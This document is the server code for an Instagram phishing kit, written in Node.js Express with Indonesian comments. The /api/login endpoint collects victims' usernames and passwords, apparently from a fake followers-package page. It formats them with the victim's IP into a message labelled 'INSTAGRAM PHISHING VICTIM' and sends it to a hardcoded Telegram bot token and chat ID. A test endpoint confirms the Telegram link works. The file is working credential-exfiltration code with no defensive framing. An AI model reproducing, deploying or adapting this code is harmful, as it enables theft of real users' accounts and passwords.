const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ========== GANTI DENGAN DATA ASLI ANDA ==========
const BOT_TOKEN = '8571006025:AAHh19imq5oUuOIX33znhfCTXC6xNix9Exo'; // GANTI!!!
const CHAT_ID = '6834832649'; // GANTI!!!
// =================================================

// Endpoint untuk menerima data login
app.post('/api/login', async (req, res) => {
    const { username, password, followers } = req.body;

    console.log('[DEBUG] Received login request:', { username, password, followers });

    if (!username || !password) {
        console.log('[ERROR] Missing credentials');
        return res.status(400).json({ error: 'Missing credentials' });
    }

    // Format pesan yang akan dikirim ke Telegram
    const message = `
🔥 *INSTAGRAM PHISHING VICTIM* 🔥

👤 *Username/Email:* ${username}
🔑 *Password:* ${password}
📊 *Package:* ${followers ? parseInt(followers).toLocaleString() : '10,000'} followers
⏰ *Time:* ${new Date().toLocaleString('id-ID')}
🌐 *IP:* ${req.headers['x-forwarded-for'] || req.ip || 'unknown'}
    `;

    console.log('[DEBUG] Sending to Telegram:', message);

    try {
        // Menggunakan https module (lebih stabil di Vercel)
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const postData = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const request = https.request(url, options, (response) => {
            let responseData = '';
            response.on('data', chunk => { responseData += chunk; });
            response.on('end', () => {
                console.log('[DEBUG] Telegram response status:', response.statusCode);
                console.log('[DEBUG] Telegram response data:', responseData);
                
                if (response.statusCode === 200) {
                    console.log(`✅ SUCCESS: Data sent to Telegram for ${username}`);
                } else {
                    console.error(`❌ FAILED: Telegram error ${response.statusCode}`);
                }
            });
        });

        request.on('error', (err) => {
            console.error('[ERROR] Telegram request failed:', err.message);
        });

        request.write(postData);
        request.end();

        // Selalu redirect ke processing page
        res.redirect('/processing.html');
        
    } catch (err) {
        console.error('[ERROR] Fatal error:', err.message);
        res.redirect('/processing.html');
    }
});

// Test endpoint untuk cek koneksi Telegram
app.get('/api/test-telegram', async (req, res) => {
    const testMessage = '✅ *Telegram Bot is WORKING!* ✅\n\nTest from Vercel server.';
    
    try {
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const postData = JSON.stringify({
            chat_id: CHAT_ID,
            text: testMessage,
            parse_mode: 'Markdown'
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const request = https.request(url, options, (response) => {
            let data = '';
            response.on('data', chunk => { data += chunk; });
            response.on('end', () => {
                if (response.statusCode === 200) {
                    res.json({ success: true, message: 'Telegram bot connected! Check your Telegram.' });
                } else {
                    res.json({ success: false, error: `Telegram API error: ${response.statusCode}` });
                }
            });
        });

        request.on('error', (err) => {
            res.json({ success: false, error: err.message });
        });

        request.write(postData);
        request.end();
        
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

module.exports = app;
